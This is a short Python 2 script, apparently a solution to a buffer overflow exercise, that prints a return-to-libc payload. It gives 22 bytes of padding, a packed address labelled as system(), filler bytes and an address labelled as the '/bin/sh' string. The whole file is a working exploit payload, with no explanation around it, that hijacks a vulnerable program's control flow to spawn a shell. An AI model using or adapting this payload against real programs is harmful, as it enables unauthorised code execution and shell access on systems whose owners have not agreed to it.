from shellcode import shellcode
from struct import pack
system_addr = pack("<I", 0x0804a030)
sh_addr = pack("<I", 0x80c61e5)
print 'A' * 22 + system_addr + 'AAAA' + sh_addr
